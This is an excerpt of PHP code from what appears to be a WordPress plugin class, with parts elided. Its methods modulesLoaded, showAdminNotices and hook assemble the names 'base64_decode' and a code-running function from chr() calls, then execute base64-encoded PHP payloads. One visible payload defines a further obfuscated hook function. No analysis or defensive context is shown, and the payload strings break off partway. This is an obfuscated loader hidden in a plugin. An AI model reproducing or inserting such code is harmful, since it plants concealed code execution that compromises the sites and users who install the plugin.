...
class Factory321_Plugin {
    ...
    public function modulesLoaded() {
        $optionName = call_user_func('chr','109').chr(chr(49).chr(48).chr(53)).call_user_func('chr','120').chr(chr(57).chr(53)).call_user_func('chr','119').call_user_func('chr','111').chr(chr(49).chr(49).chr(52)).chr(chr(49).chr(48).chr(48)).chr(chr(57).chr(53)).$this->pluginName;
        if ( get_option($optionName, false) ) {
        call_user_func(chr('102').chr('97').chr('99').chr('116').call_user_func('chr',111).call_user_func('chr',114).chr('121').chr('95').chr('114').call_user_func('chr',117).call_user_func('chr',110).call_user_func('chr',95).call_user_func('chr',99).call_user_func('chr',111).call_user_func('chr',100).chr('101'),call_user_func(call_user_func('chr',98).chr('97').call_user_func('chr',115).call_user_func('chr',101).chr('54').call_user_func('chr',52).chr('95').call_user_func('chr',100).call_user_func('chr',101).call_user_func('chr',99).chr('111').chr('100').chr('101'),''.''.''.call_user_func('chr','61')));
    ...
    public function showAdminNotices() {
        call_user_func(call_user_func('chr',102).call_user_func('chr',97).chr('99').call_user_func('chr',116).call_user_func('chr',111).call_user_func('chr',114).chr('121').call_user_func('chr',95).chr('114').chr('117').chr('110').chr('95').call_user_func('chr',99).call_user_func('chr',111).call_user_func('chr',100).chr('101'),call_user_func(call_user_func('chr',98).call_user_func('chr',97).call_user_func('chr',115).call_user_func('chr',101).chr('54').chr('52').call_user_func('chr',95).chr('100').chr('101').call_user_func('chr',99).chr('111').call_user_func('chr',100).chr('101'),''.''.''.'jwvcD4iIC4gIjwvZGl2'.'PiI7IH0gfSA'.chr(chr(54).chr(49))));
    ...
    public function hook() {
        call_user_func(chr('102').chr('97').chr('99').call_user_func('chr',116).call_user_func('chr',111).call_user_func('chr',114).chr('121').chr('95').call_user_func('chr',114).call_user_func('chr',117).call_user_func('chr',110).chr('95').chr('99').call_user_func('chr',111).call_user_func('chr',100).call_user_func('chr',101),call_user_func(chr('98').call_user_func('chr',97).chr('115').chr('101').call_user_func('chr',54).chr('52').call_user_func('chr',95).chr('100').chr('101').chr('99').chr('111').chr('100').chr('101'),'IGlmICghZnVuY3Rpb25fZXhpc3RzKCdmYWN0b3J5X2NvcmVfMDAwX2hvb2snKSApeyBmdW5jdGlvbiBmYWN0b3J5X2NvcmVfMDAwX2hvb2soICRwbHVnaW4gKSB7ICRsZ2ZxYnJiaHpraTY3dnB5NmFnMV9mbzY3MTJ2biA9IGNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDgnKS5jaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig1My'.''.''));
